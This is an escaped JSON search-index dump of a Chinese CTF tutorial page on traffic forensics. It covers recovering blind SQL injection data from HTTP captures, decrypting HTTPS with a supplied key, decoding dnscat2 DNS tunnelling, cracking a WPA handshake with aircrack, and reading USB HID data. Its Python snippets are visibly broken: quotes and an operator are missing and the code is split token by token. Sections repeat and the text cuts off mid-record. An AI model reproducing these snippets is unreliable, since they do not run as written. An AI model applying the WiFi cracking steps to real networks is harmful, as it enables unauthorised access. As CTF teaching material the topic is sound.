\n\u505a\u4ec0\u4e48?\n\n\nTODO\n\n\n\u5e38\u89c1\u534f\u8bae\n\n\nHTTP/HTTPs\n\n\n\u4e3b\u8981\u96c6\u4e2d\u5728\u6d41\u91cf\u4e2d\u9644\u4ef6\u6216\u662f\u603b\u4f53\u5206\u6790\u4e0a,\u641e\u660e\u767d\u6d41\u91cf\u5728\u505a\u4ec0\u4e48\u4e4b\u540e,\u57fa\u672c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u5bfb\u627eflag\u7684\u4f4d\u7f6e\n\n\nHTTP\n\n\n\u4f8b\u9898\n\n\n\u6c5f\u82cf\u7701\u9886\u822a\u676f-2017:hack\n\n\n\u603b\u4f53\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa:\n\n\n\n\nHTTP\n\u4e3a\u4e3b\n\n\n102.168.173.134\n\u4e3a\u4e3b\n\n\n\u4e0d\u5b58\u5728\u9644\u4ef6\n\n\n\n\n\n\n\u4ece\u8fd9\u5f20\u56fe,\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u521d\u8fd9\u662f\u4e00\u4e2a\u5728\nsql\u6ce8\u5165-\u76f2\u6ce8\u65f6\u4ea7\u751f\u7684\u6d41\u91cf\u5305\n\n\n\u5230\u6b64\u4e3a\u6b62,\u57fa\u672c\u53ef\u4ee5\u5224\u65adflag\u7684\u65b9\u5411,\u63d0\u53d6\u51fa\u6240\u6709\u7684url\u540e,\u7528\npython\n\u8f85\u52a9\u5373\u53ef\u5f97\u5230flag\n\n\n\n\n\n\n\u63d0\u53d6url: \ntshark -r hack.pcap -T fields  -e http.request.full_uri|tr -s '\\n'|grep flag \n log\n\n\n\n\n\n\n\u5f97\u5230\u76f2\u6ce8\u7ed3\u679c\n\n\n\n\n\n\nimport\n \nre\n\n\n\nwith\n \nopen\n(\nlog\n)\n \nas\n \nf\n:\n\n    \ntmp\n \n=\n \nf\n.\nread\n()\n\n    \nflag\n \n=\n \n\n    \ndata\n \n=\n \nre\n.\nfindall\n(\nr\n=(\\d*)%23\n,\ntmp\n)\n\n    \ndata\n \n=\n \n[\nint\n(\ni\n)\n \nfor\n \ni\n \nin\n \ndata\n]\n\n    \nfor\n \ni\n,\nnum\n \nin\n \nenumerate\n(\ndata\n):\n\n        \ntry\n:\n\n            \nif\n \nnum\n \n \ndata\n[\ni\n+\n1\n]:\n\n                \nflag\n \n+=\n \nchr\n(\nnum\n)\n\n        \nexcept\n \nException\n:\n\n            \npass\n\n    \nprint\n \nflag\n\n\n\n\n\nHTTPS\n\n\nHTTPs = HTTP + SSL / TLS\n.\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u4f20\u8f93\u90fd\u4f1a\u901a\u8fc7TLS\u8fdb\u884c\u52a0\u5bc6\uff0c\u6240\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u90fd\u662f\u52a0\u5bc6\u540e\u7684\u6570\u636e\n\n\n\n\nwireshark\u5206\u6790HTTPs\n\n\n\n\n\u4f8b\u9898\n:\n\n- \nhack-dat-kiwi-ctf-2015:ssl-sniff-2\n\n\n\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u662fSSL\u52a0\u5bc6\u8fc7\u7684\u6570\u636e,\u5bfc\u5165\u9898\u76ee\u63d0\u4f9b\u7684\nserver.key.insecure\n,\u5373\u53ef\u89e3\u5bc6\n\n\nGET /key.html HTTP/1.1\nHost: localhost\n\nHTTP/1.1 200 OK\nDate: Fri, 20 Nov 2015 14:16:24 GMT\nServer: Apache/2.4.7 (Ubuntu)\nLast-Modified: Fri, 20 Nov 2015 14:15:54 GMT\nETag: \n1c-524f98378d4e1\n\nAccept-Ranges: bytes\nContent-Length: 28\nContent-Type: text/html\n\nThe key is 39u7v25n1jxkl123\n\n\n\n\nFTP\n\n\nDNS\n\n\nDNS\u901a\u5e38\u4e3aUDP\u534f\u8bae,\u62a5\u6587\u683c\u5f0f\n\n\n+-------------------------------+\n\n|\n \u62a5\u6587\u5934                         \n|\n\n+-------------------------------+\n\n|\n \u95ee\u9898 \n(\n\u5411\u670d\u52a1\u5668\u63d0\u51fa\u7684\u67e5\u8be2\u90e8\u5206\n)\n    \n|\n\n+-------------------------------+\n\n|\n \u56de\u7b54 \n(\n\u670d\u52a1\u5668\u56de\u590d\u7684\u8d44\u6e90\u8bb0\u5f55\n)\n      \n|\n\n+-------------------------------+\n\n|\n \u6388\u6743 \n(\n\u6743\u5a01\u7684\u8d44\u6e90\u8bb0\u5f55\n)\n           \n|\n\n+-------------------------------+\n\n|\n \u683c\u5916\u7684 \n(\n\u683c\u5916\u7684\u8d44\u6e90\u8bb0\u5f55\n)\n         \n|\n\n+-------------------------------+\n\n\n\n\n\u67e5\u8be2\u5305\u53ea\u6709\u5934\u90e8\u548c\u95ee\u9898\u4e24\u4e2a\u90e8\u5206\uff0cDNS\u6536\u5230\u67e5\u8be2\u5305\u540e\uff0c\u6839\u636e\u67e5\u8be2\u5230\u7684\u4fe1\u606f\u8ffd\u52a0\u56de\u7b54\u4fe1\u606f\u3001\u6388\u6743\u673a\u6784\u3001\u989d\u5916\u8d44\u6e90\u8bb0\u5f55\uff0c\u5e76\u4e14\u4fee\u6539\u4e86\u5305\u5934\u7684\u76f8\u5173\u6807\u8bc6\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002\n\n\n\u6bcf\u4e2aquestion\u90e8\u5206\n\n\n   0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                                               |\n /                     QNAME                     /\n /                                               /\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                     QTYPE                     |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                     QCLASS                    |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n ```\n\n- QNAME\uff1a\u4e3a\u67e5\u8be2\u7684\u57df\u540d\uff0c\u662f\u53ef\u53d8\u957f\u7684\uff0c\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u5c06\u57df\u540d\u7528.\u53f7\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u6bcf\u4e2a\u90e8\u5206\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8be5\u90e8\u5206\u7684\u957f\u5ea6\uff0c\u6700\u540e\u52a0\u4e00\u4e2a0\u5b57\u8282\u8868\u793a\u7ed3\u675f\n- QTYPE\uff1a\u536016\u4f4d\uff0c\u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u5171\u670916\u79cd\uff0c\u5e38\u7528\u503c\u6709\uff1a1\uff08A\u8bb0\u5f55\uff0c\u8bf7\u6c42\u4e3b\u673aIP\u5730\u5740\uff09\u30012\uff08NS\uff0c\u8bf7\u6c42\u6388\u6743DNS\u670d\u52a1\u5668\uff09\u30015\uff08CNAME\u522b\u540d\u67e5\u8be2\uff09\n\n\n\n**\u4f8b\u9898**\n\n- [BSides San Francisco CTF 2017 : dnscap-500](https://github.com/ctfs/write-ups-2017/tree/master/bsidessf-ctf-2017/forensics/dnscap-500)\n\n- Step:\n\n    - wireshark \u6253\u5f00\u53d1\u73b0\u5168\u90e8\u4e3aDNS\u534f\u8bae,\u67e5\u8be2\u540d\u4e3a\u5927\u91cf\u5b57\u7b26\u4e32`([\\w\\.]+)\\.skullseclabs\\.org`\n\n    - `tshark -r dnscap.pcap -T fields -e dns.qry.name \n hex`\u63d0\u53d6\u540e\uff0cpython\u8f6c\u7801\n\n```python\nimport re\n\n\nfind = \n\n\nwith open(\nhex\n,\nrb\n) as f:\n    for i in f:\n        text = re.findall(r\n([\\w\\.]+)\\.skull\n,i)\n        if text:\n            find += text[0].replace(\n.\n,\n)\nprint find\n\n\n\n\n\n\n\u53d1\u73b0\u51e0\u6761\u5173\u952e\u4fe1\u606f\n\n\n\n\nWelcome to dnscap! The flag is below, have fun!!\nWelcome to dnscap! The flag is below, have fun!!\n!command (sirvimes)\n...\nIHDR\ngAMA\nbKGD\n        pHYs\nIHDR\ngAMA\nbKGD\n        pHYs\ntIME\nIDATx\n...\n2017-02-01T21:04:00-08:00\nIEND\nconsole (sirvimes)\nconsole (sirvimes)\nGood luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously,\nGood luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, d[\ngood luck. :)+\n\n\nflag\u786e\u5b9e\u5305\u542b\u5728\u5176\u4e2d,\u4f46\u662f\u6709\u5927\u91cf\u91cd\u590d\u4fe1\u606f,\u4e00\u662f\u5e94\u4e3a\nquestion\n\u5728dns\u534f\u8bae\u4e2d\u67e5\u8be2\u548c\u53cd\u9988\u65f6\u90fd\u4f1a\u7528\u5230,\n-Y \nip.src == 192.168.43.91\n\u8fdb\u884c\u8fc7\u6ee4\u540e\u53d1\u73b0\u8fd8\u662f\u6709\u4e0d\u5c11\u91cd\u590d\u90e8\u5206\n\n%2A}\n%2A}\n%2A}q\n%2A}x\n%2A}\nIHDR\ngAMA\nbKGD\n        pHYs\ntIME\nIDATx\nHBBH\nCxRH!\nC1%t\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\n\n\n\n\n\n\u6839\u636e\u53d1\u73b0\u7684\ndnscat\n\u627e\u5230 \nhttps://github.com/iagox86/dnscat2/blob/master/doc/protocol.md\n \u8fd9\u91cc\u4ecb\u7ecd\u4e86\ndnscat\n\u534f\u8bae\u7684\u76f8\u5173\u4fe1\u606f,\u8fd9\u662f\u4e00\u79cd\u901a\u8fc7DNS\u4f20\u9012\u6570\u636e\u7684\u53d8\u79cd\u534f\u8bae,\u9898\u76ee\u6587\u4ef6\u4e2d\u5e94\u8be5\u672a\u4f7f\u7528\u52a0\u5bc6,\u6240\u4ee5\u76f4\u63a5\u770b\u8fd9\u91cc\u7684\u6570\u636e\u5757\u4fe1\u606f\n\n\n\n\nMESSAGE_TYPE_MSG: [0x01]\n(uint16_t) packet_id\n(uint8_t) message_type [0x01]\n(uint16_t) session_id\n(uint16_t) seq\n(uint16_t) ack\n(byte[]) data\n\n\n\n\n\n\n\u5728\nqry.name\n\u4e2d\u53bb\u9664\u5176\u4f59\u5b57\u6bb5,\u53ea\u7559\u4e0b\ndata\n\u5feb,\u4ece\u800c\u5408\u5e76\u6570\u636e,\u518d\u4ece16\u8fdb\u5236\u4e2d\u68c0\u7d22\n89504e.....6082\n\u63d0\u53d6\npng\n,\u5f97\u5230flag\n\n\n\n\nimport\n \nre\n\n\n\n\nfind\n \n=\n \n[]\n\n\n\nwith\n \nopen\n(\nhex\n,\nrb\n)\n \nas\n \nf\n:\n\n    \nfor\n \ni\n \nin\n \nf\n:\n\n        \ntext\n \n=\n \nre\n.\nfindall\n(\nr\n([\\w\\.]+)\\.skull\n,\ni\n)\n\n        \nif\n \ntext\n:\n\n            \ntmp\n \n=\n  \ntext\n[\n0\n]\n.\nreplace\n(\n.\n,\n)\n\n            \nfind\n.\nappend\n(\ntmp\n[\n18\n:])\n\n\nlast\n \n=\n \n[]\n\n\n\nfor\n \ni\n \nin\n \nfind\n:\n\n    \nif\n \ni\n \nnot\n \nin\n \nlast\n:\n\n        \nlast\n.\nappend\n(\ni\n)\n\n\n\n\nprint\n  \n.\njoin\n(\nlast\n)\n\n\n\n\n\nflag\n\n\n\n\n\u76f8\u5173\u9898\u76ee\n\n\n\n\nIceCTF-2016:Search\n\n\nEIS-2017:DNS 101\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttps://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md\n\n\nhttps://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough\n\n\n\n\nWIFI\n\n\n\n\n802.11\u662f\u73b0\u4eca\u65e0\u7ebf\u5c40\u57df\u7f51\u901a\u7528\u7684\u6807\u51c6,\u5e38\u89c1\u8ba4\u8bc1\u65b9\u5f0f\n- \u4e0d\u542f\u7528\u5b89\u5168\u200d\u200d\n- WEP\u200d\u200d\n- WPA/WPA2-PSK\uff08\u9884\u5171\u4eab\u5bc6\u94a5\uff09\u200d\u200d\n- PA/WPA2 802.1X \uff08radius\u8ba4\u8bc1\uff09\n\n\n\n\nWPA-PSK\n\n\n\u8ba4\u8bc1\u5927\u81f4\u8fc7\u7a0b\u5982\u4e0b\u56fe\n\n\n\n\n\u5176\u4e2d\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b\n\n\n\n\n\n\n4\u6b21\u63e1\u624b\u5f00\u59cb\u4e8e\u9a8c\u8bc1\u5668(AP)\uff0c\u5b83\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c(ANonce)\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005\n\n\n\u8bf7\u6c42\u8005\u4e5f\u4ea7\u751f\u4e86\u5b83\u81ea\u5df1\u7684\u968f\u673aSNonce\uff0c\u7136\u540e\u7528\u8fd9\u4e24\u4e2aNonces\u4ee5\u53caPMK\u751f\u6210\u4e86PTK\u3002\u8bf7\u6c42\u8005\u56de\u590d\u6d88\u606f2\u7ed9\u9a8c\u8bc1\u5668,\u8fd8\u6709\u4e00\u4e2aMIC\uff08message integrity code\uff0c\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\u4f5c\u4e3aPMK\u7684\u9a8c\u8bc1\n\n\n\u5b83\u5148\u8981\u9a8c\u8bc1\u8bf7\u6c42\u8005\u5728\u6d88\u606f2\u4e2d\u53d1\u6765\u7684MIC\u7b49\u4fe1\u606f\uff0c\u9a8c\u8bc1\u6210\u529f\u540e\uff0c\u5982\u679c\u9700\u8981\u5c31\u751f\u6210GTK\u3002\u7136\u540e\u53d1\u9001\u6d88\u606f3\n\n\n\u8bf7\u6c42\u8005\u6536\u5230\u6d88\u606f3\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u5bc6\u94a5\uff0c\u53d1\u9001\u6d88\u606f4\uff0c\u4e00\u4e2a\u786e\u8ba4\u4fe1\u606f\u3002\u9a8c\u8bc1\u5668\u6536\u5230\u6d88\u606f4\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u76f8\u540c\u7684\u5bc6\u94a5\n\n\n\n\n\u4f8b\u9898\n  \n\n\n\n\n\u5b9e\u9a8c\u5427: \nhttp://ctf5.shiyanbar.com/misc/shipin.cap\n\n\n\n\n\u4ece\u5927\u91cf\u7684\nDeauth\n \u653b\u51fb\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u662f\u4e00\u4e2a\u7834\u89e3wifi\u65f6\u7684\u6d41\u91cf\u653b\u51fb\n\n\n\u540c\u65f6\u4e5f\u6210\u529f\u53d1\u73b0\u4e86\u63e1\u624b\u5305\u4fe1\u606f\n\n\n\n\n\u63a5\u4e0b\u6765\u8dd1\u5bc6\u7801\n\n\n\n\nlinux: aircrack\u5957\u4ef6\n\n\nwindows: wifipr,\u901f\u5ea6\u6bd4esaw\u5feb,GTX850\u80fd\u5c06\u8fd110w\\s  :)\n\n\n\n\n\u5f97\u5230\u5bc6\u7801\n88888888\n\u5728wireshark\u4e2d\nEdit -\n Preferences -\n Protocols -\n IEEE802.11 -\n Edit\n\u4ee5\nkey:SSID\n\u5f62\u5f0f\u586b\u5165\u5373\u53ef\u89e3\u5bc6wifi\u5305\u770b\u5230\u660e\u6587\u6d41\u91cf\n\n\n\n\nKCARCK\u76f8\u5173: \nhttps://www.krackattacks.com/\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://www.freebuf.com/articles/wireless/58342.html\n\n\nhttp://blog.csdn.net/keekjkj/article/details/46753883\n\n\n\n\nUSB\n\n\nUSB\u8be6\u8ff0\n: \nhttp://www.usb.org/developers/hidpage/Hut1_12v2.pdf\n\n\n\n\n\u9f20\u6807\u534f\u8bae\n\n\n\n\n\u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684\n\n\n\n\n\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002\n\n\n\u5f97\u5230\u8fd9\u4e9b\u70b9\u7684\u4fe1\u606f\u540e,\u5373\u53ef\u6062\u590d\u51fa\u9f20\u6807\u79fb\u52a8\u8f68\u8ff9\n\n\n\n\n\n\nTools\n\n\n\n\nUsbMiceDataHacker\n\n\n\n\n\n\n\n\n\u952e\u76d8\u534f\u8bae\n\n\n\n\n\n\n\u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282\n\n\n\n\n\u6839\u636edata\u503c\u4e0e\u5177\u4f53\u952e\u4f4d\u7684\u5bf9\u5e94\u5173\u7cfb\n\n\n\n\n\u53ef\u4ece\u6570\u636e\u5305\u6062\u590d\u51fa\u952e\u76d8\u7684\u6848\u4ef6\u4fe1\u606f\n\n\n\n\nTools\n\n\nUsbKeyboardDataHacker\n\n\n\n\n\n\n\n\n\u53c2\u8003\n\n- \nhttps://www.anquanke.com/post/id/85218", 
            "title": "\u534f\u8bae\u5206\u6790"
        }, 
        {
            "location": "/misc/traffic/protocols/#wireshark", 
            "text": "", 
            "title": "Wireshark \u5e38\u7528\u529f\u80fd\u4ecb\u7ecd"
        }, 
        {
            "location": "/misc/traffic/protocols/#_1", 
            "text": "\u663e\u793a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u7528\u5f88\u591a\u4e0d\u540c\u7684\u53c2\u6570\u6765\u4f5c\u4e3a\u5339\u914d\u6807\u51c6\uff0c\u6bd4\u5982IP\u5730\u5740\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u3001\u67d0\u4e9b\u534f\u8bae\u5934\u90e8\u7684\u53c2\u6570\u3002\u6b64\u5916\uff0c\u7528\u6237\u4e5f\u7528\u4e00\u4e9b\u6761\u4ef6\u5de5\u5177\u548c\u4e32\u8054\u8fd0\u7b97\u7b26\u521b\u5efa\u51fa\u66f4\u52a0\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u3002\u7528\u6237\u53ef\u4ee5\u5c06\u4e0d\u540c\u7684\u8868\u8fbe\u5f0f\u7ec4\u5408\u8d77\u6765\uff0c\u8ba9\u8f6f\u4ef6\u663e\u793a\u7684\u6570\u636e\u5305\u8303\u56f4\u66f4\u52a0\u7cbe\u786e\u3002\u5728\u6570\u636e\u5305\u5217\u8868\u9762\u677f\u4e2d\u663e\u793a\u7684\u6240\u6709\u6570\u636e\u5305\u90fd\u53ef\u4ee5\u7528\u6570\u636e\u5305\u4e2d\u5305\u542b\u7684\u5b57\u6bb5\u8fdb\u884c\u8fc7\u6ee4\u3002  [not] Expression [and|or] [not] Expression  \u7ecf\u5e38\u8981\u7528\u5230\u5404\u79cd\u8fd0\u7b97\u7b26     \u8fd0\u7b97\u7b26  \u8bf4\u660e      ==  \u7b49\u4e8e    !=  \u4e0d\u7b49\u4e8e     \u5927\u4e8e     \u5c0f\u4e8e    =  \u5927\u4e8e\u7b49\u4e8e    =  \u5c0f\u4e8e\u7b49\u4e8e    \u4e0e  and ,     \u6216  or , ||    \u975e  ! , not", 
            "title": "\u663e\u793a\u8fc7\u6ee4\u5668"
        }, 
        {
            "location": "/misc/traffic/protocols/#_2", 
            "text": "\u501f\u52a9\u4e8e\u8fc7\u6ee4\u5668\u7a97\u53e3     \u501f\u52a9\u4e8e\u5de5\u5177\u6761\u7684\u8f93\u5165\u680f     \u5c06\u6570\u636e\u5305\u67d0\u4e2a\u5c5e\u6027\u503c\u6307\u5b9a\u4e3a\u8fc7\u6ee4\u6761\u4ef6      Note  \u590d\u6742\u7684\u8fc7\u6ee4\u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7b2c\u4e09\u79cd\u65b9\u5f0f\u5f97\u5230\u8fc7\u6ee4\u8bed\u6cd5", 
            "title": "\u914d\u7f6e\u65b9\u6cd5"
        }, 
        {
            "location": "/misc/traffic/protocols/#_3", 
            "text": "", 
            "title": "\u4fe1\u606f\u7edf\u8ba1"
        }, 
        {
            "location": "/misc/traffic/protocols/#protocol-history", 
            "text": "\u8fd9\u4e2a\u7a97\u53e3\u73b0\u5b9e\u7684\u662f\u6355\u6349\u6587\u4ef6\u5305\u542b\u7684\u6240\u6709\u534f\u8bae\u7684\u6811\u72b6\u5206\u652f   \u5305\u542b\u7684\u5b57\u6bb5     \u540d\u79f0  \u542b\u4e49      Protocol\uff1a  \u534f\u8bae\u540d\u79f0    % Packets\uff1a  \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u6570\u76ee\u5728\u6355\u6349\u6587\u4ef6\u6240\u6709\u5305\u6240\u5360\u7684\u6bd4\u4f8b    Packets\uff1a  \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u7684\u6570\u76ee    Bytes\uff1a  \u542b\u6709\u8be5\u534f\u8bae\u7684\u5b57\u8282\u6570    Mbit/s\uff1a  \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd    End Packets\uff1a  \u8be5\u534f\u8bae\u4e2d\u7684\u5305\u7684\u6570\u76ee\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09    End Bytes\uff1a  \u8be5\u534f\u8bae\u4e2d\u7684\u5b57\u8282\u6570\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09    End Mbit/s\uff1a  \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09     \u8fd9\u4e00\u529f\u80fd\u53ef\u4ee5\u4e3a\u5206\u6790\u6570\u636e\u5305\u7684\u4e3b\u8981\u65b9\u5411\u63d0\u4f9b\u4f9d\u636e", 
            "title": "Protocol History(\u534f\u8bae\u5206\u7ea7)"
        }, 
        {
            "location": "/misc/traffic/protocols/#conversation", 
            "text": "\u53d1\u751f\u4e8e\u4e00\u7279\u5b9a\u7aef\u70b9\u7684IP\u95f4\u7684\u6240\u6709\u6d41\u91cf.    Note   \u67e5\u770b\u6536\u53d1\u5927\u91cf\u6570\u636e\u6d41\u7684IP\u5730\u5740\u3002\u5982\u679c\u662f\u4f60\u77e5\u9053\u7684\u670d\u52a1\u5668\uff08\u4f60\u8bb0\u5f97\u670d\u52a1\u5668\u7684\u5730\u5740\u6216\u5730\u5740\u8303\u56f4\uff09\uff0c\u90a3\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff1b\u4f46\u4e5f\u6709\u53ef\u80fd\u53ea\u662f\u67d0\u53f0\u8bbe\u5907\u6b63\u5728\u626b\u63cf\u7f51\u7edc\uff0c\u6216\u4ec5\u662f\u4e00\u53f0\u4ea7\u751f\u8fc7\u591a\u6570\u636e\u7684PC\u3002  \u67e5\u770b\u626b\u63cf\u6a21\u5f0f\uff08scan pattern\uff09\u3002\u8fd9\u53ef\u80fd\u662f\u4e00\u6b21\u6b63\u5e38\u7684\u626b\u63cf\uff0c\u5982SNMP\u8f6f\u4ef6\u53d1\u9001ping\u62a5\u6587\u4ee5\u67e5\u627e\u7f51\u7edc\uff0c\u4f46\u901a\u5e38\u626b\u63cf\u90fd\u4e0d\u662f\u597d\u4e8b\u60c5", 
            "title": "Conversation(\u5bf9\u8bdd)"
        }, 
        {
            "location": "/misc/traffic/protocols/#endpoints", 
            "text": "\u8fd9\u4e00\u5de5\u5177\u5217\u51fa\u4e86Wireshark\u53d1\u73b0\u7684\u6240\u6709endpoints\u4e0a\u7684\u7edf\u8ba1\u4fe1\u606f", 
            "title": "EndPoints(\u7aef\u70b9)"
        }, 
        {
            "location": "/misc/traffic/protocols/#http", 
            "text": "Packet Counter     \u53c2\u8003   http://blog.jobbole.com/73482/  http://www.vuln.cn/2103", 
            "title": "HTTP"
        }, 
        {
            "location": "/misc/traffic/protocols/#_4", 
            "text": "\u6839\u636e\u603b\u4f53\u4fe1\u606f\u8fc5\u901f\u628a\u63e1\u6d41\u91cf\u5305\u603b\u4f53\u7279\u5f81,\u641e\u6e05\u695a  \u505a\u4ec0\u4e48?  TODO", 
            "title": "\u4fe1\u606f\u7edf\u8ba1 \u8fdb\u9636\u7248"
        }, 
        {
            "location": "/misc/traffic/protocols/#_5", 
            "text": "", 
            "title": "\u5e38\u89c1\u534f\u8bae"
        }, 
        {
            "location": "/misc/traffic/protocols/#httphttps", 
            "text": "\u4e3b\u8981\u96c6\u4e2d\u5728\u6d41\u91cf\u4e2d\u9644\u4ef6\u6216\u662f\u603b\u4f53\u5206\u6790\u4e0a,\u641e\u660e\u767d\u6d41\u91cf\u5728\u505a\u4ec0\u4e48\u4e4b\u540e,\u57fa\u672c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u5bfb\u627eflag\u7684\u4f4d\u7f6e", 
            "title": "HTTP/HTTPs"
        }, 
        {
            "location": "/misc/traffic/protocols/#http_1", 
            "text": "\u4f8b\u9898  \u6c5f\u82cf\u7701\u9886\u822a\u676f-2017:hack  \u603b\u4f53\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa:   HTTP \u4e3a\u4e3b  102.168.173.134 \u4e3a\u4e3b  \u4e0d\u5b58\u5728\u9644\u4ef6    \u4ece\u8fd9\u5f20\u56fe,\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u521d\u8fd9\u662f\u4e00\u4e2a\u5728 sql\u6ce8\u5165-\u76f2\u6ce8\u65f6\u4ea7\u751f\u7684\u6d41\u91cf\u5305  \u5230\u6b64\u4e3a\u6b62,\u57fa\u672c\u53ef\u4ee5\u5224\u65adflag\u7684\u65b9\u5411,\u63d0\u53d6\u51fa\u6240\u6709\u7684url\u540e,\u7528 python \u8f85\u52a9\u5373\u53ef\u5f97\u5230flag    \u63d0\u53d6url:  tshark -r hack.pcap -T fields  -e http.request.full_uri|tr -s '\\n'|grep flag   log    \u5f97\u5230\u76f2\u6ce8\u7ed3\u679c    import   re  with   open ( log )   as   f : \n     tmp   =   f . read () \n     flag   =   \n     data   =   re . findall ( r =(\\d*)%23 , tmp ) \n     data   =   [ int ( i )   for   i   in   data ] \n     for   i , num   in   enumerate ( data ): \n         try : \n             if   num     data [ i + 1 ]: \n                 flag   +=   chr ( num ) \n         except   Exception : \n             pass \n     print   flag", 
            "title": "HTTP"
        }, 
        {
            "location": "/misc/traffic/protocols/#https", 
            "text": "HTTPs = HTTP + SSL / TLS .\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u4f20\u8f93\u90fd\u4f1a\u901a\u8fc7TLS\u8fdb\u884c\u52a0\u5bc6\uff0c\u6240\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u90fd\u662f\u52a0\u5bc6\u540e\u7684\u6570\u636e   wireshark\u5206\u6790HTTPs   \u4f8b\u9898 : \n-  hack-dat-kiwi-ctf-2015:ssl-sniff-2  \u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u662fSSL\u52a0\u5bc6\u8fc7\u7684\u6570\u636e,\u5bfc\u5165\u9898\u76ee\u63d0\u4f9b\u7684 server.key.insecure ,\u5373\u53ef\u89e3\u5bc6  GET /key.html HTTP/1.1\nHost: localhost\n\nHTTP/1.1 200 OK\nDate: Fri, 20 Nov 2015 14:16:24 GMT\nServer: Apache/2.4.7 (Ubuntu)\nLast-Modified: Fri, 20 Nov 